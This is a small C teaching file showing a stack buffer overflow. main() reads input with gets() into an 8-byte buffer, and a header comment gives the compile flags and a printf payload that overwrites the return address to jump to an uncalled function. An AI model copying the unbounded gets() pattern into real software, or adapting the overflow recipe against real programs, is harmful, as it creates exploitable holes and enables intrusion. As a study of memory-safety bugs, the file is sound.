/*
 * ------------------------------------------------------------------------
 *   File Name: overflow.2.c
 *      Author: Zhao Yanbai
 *              Wed Mar 20 21:08:10 2013
 * Description: none
 * #gcc overflow.2.c -g -mpreferred-stack-boundary=2
 * #objdump -d a.out | grep NeverRunFunc
 * 08048460 <NeverRunFunc>:
 * #printf "12345678\x00000\x60\x84\x04\x08"| ./a.out
 * ------------------------------------------------------------------------
 */
#include<stdio.h>
#include<stdlib.h>
void NeverRunFunc() {
    printf("Hello Overflow World.\n");
    exit(0);
}

int main(int argc, char *argv[]){
    char buf[8];
    gets(buf);
    puts(buf);
	return 0;
}
